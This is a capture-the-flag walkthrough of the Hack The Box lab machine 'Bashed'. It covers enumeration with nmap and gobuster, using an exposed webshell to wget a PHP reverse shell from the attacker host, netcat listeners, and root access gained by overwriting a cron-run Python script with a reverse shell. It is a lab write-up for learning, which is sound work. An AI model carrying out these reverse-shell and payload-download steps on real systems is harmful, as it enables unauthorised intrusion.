---
layout: post
title: "Bashed"
categories: HTB-Walkthrough
---

![bashed1](/assets/img/bashed/bashed1.png)


Bashed is another OSCP-like box from the HTB 'retired' archive.

<h3>Nmap</h3>

`nmap -sV -Pn 10.10.10.68 |tee -a bash.txt`

```

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds
root@kali:~/HTB/retired/bashed# 

```

Only a webserver seems to be running, [gobuster](https://github.com/OJ/gobuster) can help force-browse its directories. 


`gobuster dir -u http://10.10.10.68/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .sh,.txt`

```

/uploads (Status: 301)
/images (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)

```

Gobuster finds  a few interesting directories, one of which is /dev.

![dev](/assets/img/bashed/bashed-dev1.png)

/phpbashed.php takes us to a php based bash webshell.

![phpbashed](/assets/img/bashed/bashed-phpbash.png)


<h3>Exploit</h3>

use webshell to navigate to /uploads

then try to upload evil.php (a php-reverse-shell)

`wget http://10.10.14.31/evil.php`

Browse to /uploads/evil.php and catch the shell on a netcat listener

`nc -nlvp  6969`

...we got wwwdata user shell.

<hr width="250" size="6">


<h3>Privilege Escalation</h3>

`sudo -l`

we can execute scriptmanager files via sudo...?

```

cat /home/arrexel/user.txt
2cxxxxxxxxxxxxxxxxxxxxxxxxxxxxc1

```

`sudo -u scriptmanager bash`

...now we are scriptmanager user...


<hr width="250" size="6">


The /scripts folder is owned by scriptmanager
It contains 2 files, test.py (owned by scriptmanager) and test.txt (owned by root)

Even though scriptmanager ownes test.py, it is run every minute by root...updating test.txt
....it can only do this if test.py is run by root....so we can change test.py.


Copy test.py to test1.py ...so that the original isnt lost (if we need to replace it)

Make test.py with reverse python shell to 8888 on kali machine.

Nano and vi are unusable....so we can either copy it accross as a file...
or do...

```

cat>test.py<<_EOF

then copypaste each line of the reverse shell over...
...then 'end of file' by doing 

_EOF

```


This creates test.py, with the pasted contents inside....
Its a handy way to write files when there seems no other way.

Set new listner to 8888 and wait for connection.

```


root@kali:~/HTB/retired/bashed# nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.68] 53652
/bin/sh: 0: can't access tty; job control turned off
 id
uid=0(root) gid=0(root) groups=0(root)
 cat /root/root.txt
ccxxxxxxxxxxxxxxxxxxxxxxxxxxxxe2


```

:)


